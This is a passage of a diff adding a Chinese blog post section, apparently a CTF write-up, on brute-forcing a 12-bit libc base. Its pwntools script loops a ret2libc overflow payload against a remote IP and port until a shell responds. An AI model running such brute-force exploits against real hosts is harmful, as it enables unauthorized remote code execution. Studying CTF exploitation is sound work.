+<h3 id="漏洞利用-直接爆破"><a href="#漏洞利用-直接爆破" class="headerlink" title="漏洞利用-直接爆破"></a>漏洞利用-直接爆破</h3><p>基址中开始的0xF7是不会变的，最后的0x000也是不会变的，会变的只有中间的12个bit，因此最多需要2^12即可爆破出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">libc_base = 0xf772f000#brute</span><br><span class="line"></span><br><span class="line">offse_sys = libc_base + 0x3fe70</span><br><span class="line">offse_bsh = libc_base + 0x0015da8c</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    io = remote(&apos;106.14.22.20&apos;, 23743)</span><br><span class="line"></span><br><span class="line">    payload = &apos;c&apos;*0x16 + p32(offse_sys) + &apos;a&apos;*4 + p32(offse_bsh)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    sleep(2)</span><br><span class="line">    io.sendline(&apos;echo simp1e&apos;)</span><br><span class="line">    d = io.recv(timeout=1)</span><br><span class="line">    if &apos;simp1e&apos; not in d:</span><br><span class="line">        io.close()</span><br><span class="line">        return</span><br><span class="line">    print &apos;!!!!!!&apos;</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    tt=0</span><br><span class="line">    while 1:</span><br><span class="line">        print &apos;tyyy:%d&apos;%(tt)</span><br><span class="line">        tt += 1</span><br><span class="line">        try:</span><br><span class="line">            exp()</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure></p>
 
           
         
@@ -589,7 +1065,7 @@ sudo apt-get install php5.6-mysql
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
